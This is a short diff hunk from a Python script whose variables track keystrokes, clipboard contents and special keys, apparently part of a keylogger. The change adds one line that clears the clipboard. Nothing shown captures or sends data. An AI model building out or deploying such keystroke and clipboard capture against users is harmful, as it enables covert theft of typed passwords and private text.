@@ -15,6 +15,7 @@ keystrokes = ""
 lock = threading.Lock()
 last_keypress_time = time.time()
 last_clipboard = ""
+pyperclip.copy("")
 
 # Dictionary for special keys
 special_keys = {
